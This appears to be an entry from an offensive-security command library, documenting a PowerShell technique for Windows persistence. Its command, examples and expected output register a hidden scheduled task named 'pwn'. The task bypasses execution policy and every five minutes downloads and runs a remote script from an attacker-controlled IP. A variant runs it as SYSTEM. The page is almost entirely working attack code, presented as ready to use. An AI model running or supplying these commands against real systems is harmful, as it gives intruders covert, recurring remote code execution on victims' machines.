---
id: af70c197-19d7-4d58-b5d0-90740b7372da
type: command
executor: powershell
data: >-
  $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ep
  bypass -windowstyle hidden iex(New-Object
  Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"

  $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval
  (New-TimeSpan -Minutes 5)

  Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn"
  -Description "pwn"
output: >
  PS C:\ > $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument
  "-ep bypass -windowstyle hidden iex(New-Object
  Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"

  >> $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date)
  -RepetitionInterval (New-TimeSpan -Minutes 5)

  >> Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn"
  -Description "pwn"


  TaskPath                                      
  TaskName                          State

  --------                                      
  --------                          -----

  \                                             
  pwn                               Ready
created_at: '2020-03-13T01:36:22.738585+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - persistence
  - powershell
verified: true
validated: true
---

# powershell-register-repeating-scheduled-task

## Command

```powershell
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Description "pwn"
```

## Description

This PowerShell command sequence creates and registers a scheduled task that runs a remote PowerShell script download every 5 minutes. It uses Task Scheduler cmdlets to define the action (download and execute) and trigger (repeating interval), ideal for persistence in Windows environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Execute 'powershell.exe' | Program to execute | Yes |
| -Argument "-ep bypass ..." | Arguments for PowerShell, including bypass policy, hidden window, and download string | Yes |
| http://$_TARGET_IP/$_SCRIPT.ps1 | URL of the remote script | Yes |
| -Once -At (Get-Date) | Trigger start: immediately | Yes |
| -RepetitionInterval (New-TimeSpan -Minutes 5) | Repeat every 5 minutes | Yes |
| -TaskName "pwn" | Name of the task | Yes |
| -Description "pwn" | Task description | No |
| $_TARGET_IP | Attacker's IP hosting the script | Yes |
| $_SCRIPT.ps1 | Name of the remote PowerShell script | Yes |

## Examples

### Basic Usage

```powershell
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Description "pwn"
```

### Advanced Usage

To run as SYSTEM and add a principal:

```powershell
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Principal $principal
```

## Expected Output

```
PS C:\ > $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
>> $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
>> Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Description "pwn"

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              pwn                               Ready
```

The task appears as "Ready" in Task Scheduler; verify with Get-ScheduledTask.

## Related

- [[procedures/Create-Windows-Scheduled-Task-for-Persistence]]
- [[commands/schtasks-create-repeating-minute-task]]
